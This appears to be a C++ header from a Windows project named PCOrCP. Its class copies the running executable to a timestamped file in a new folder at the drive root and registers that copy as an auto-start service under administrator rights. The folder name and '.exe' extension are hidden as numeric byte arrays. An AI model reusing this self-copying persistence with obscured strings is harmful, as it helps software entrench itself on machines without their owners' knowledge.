#pragma once
#include "Global.h"
#include "PCOrCP_server_developer_Type.h"
using namespace PCOrCP::server::developer;
using namespace PCOrCP::server;
namespace PCOrCP {
    namespace server {
		class Local
		{
		private:
			vector<uint8_t> argvPath;
			vector<uint8_t> drive;
			void Clear() {
				argvPath.clear();
				argvPath.shrink_to_fit();
				drive.clear();
				drive.shrink_to_fit();
			}
		public:
			Type Type = Type::Services;
			void Developer() {
				BOOL isAdmin = FALSE;
				SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
				PSID adminGroup;
				if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup) && CheckTokenMembership(NULL, adminGroup, NULL))
					FreeSid(adminGroup);
				else
				{
					Clear();
					cout << "Run as admin!!!!!" << endl;
					return;
				}
				time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
				struct tm timeInfo;
				localtime_s(&timeInfo, &currentTime);
				stringstream filename_ss;
				filename_ss << put_time(&timeInfo, "%Y_%m_%d_%H_%M_%S");
				std::string filename_str = filename_ss.str();
				std::vector<uint8_t> filename(filename_str.begin(), filename_str.end());
				drive.insert(drive.end(), filename.begin(), filename.end());
				vector<uint8_t> executable= {  46, 101, 120, 101 };
				drive.insert(drive.end(), executable.begin(), executable.end());
				string driveString(drive.begin(), drive.end());
				string argvPathString(argvPath.begin(), argvPath.end());
				fs::path sourcePath(argvPathString);
				fs::path destinationPath(driveString);
				fs::copy(sourcePath, destinationPath);
				std::wstring driveStringWide(driveString.begin(), driveString.end());
				std::string serviceName = "PCOrCP_" + filename_ss.str();
				std::wstring serviceNameWide(serviceName.begin(), serviceName.end());
				SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
				SC_HANDLE service = CreateService(
					scManager,
					serviceNameWide.c_str(),
					serviceNameWide.c_str(),
					SERVICE_ALL_ACCESS,
					SERVICE_WIN32_OWN_PROCESS,
					SERVICE_AUTO_START,
					SERVICE_ERROR_NORMAL,
					driveStringWide.c_str(),
					NULL,
					NULL,
					NULL,
					NULL,
					NULL
				);
				CloseServiceHandle(service);
				CloseServiceHandle(scManager);
				Clear();
			}
			void Services() {
				std::cout << "Services" << std::endl;
			}
			Local(vector<uint8_t> argvPath) {
				this->argvPath = argvPath;
				{
					char windowsPath[MAX_PATH];
					(void)GetWindowsDirectoryA(windowsPath, MAX_PATH);
					drive.insert(drive.end(), windowsPath, windowsPath + 3);
					vector<uint8_t> path = { 80, 67, 79, 114, 67, 80, 92 };
					drive.insert(drive.end(), path.begin(), path.end());
					string driveString(drive.begin(), drive.end());
					if (!fs::is_directory(fs::status(driveString))) {
						fs::create_directory(driveString);
						this->Type = Type::Developer;
					}
				}
			}
		};
    }
}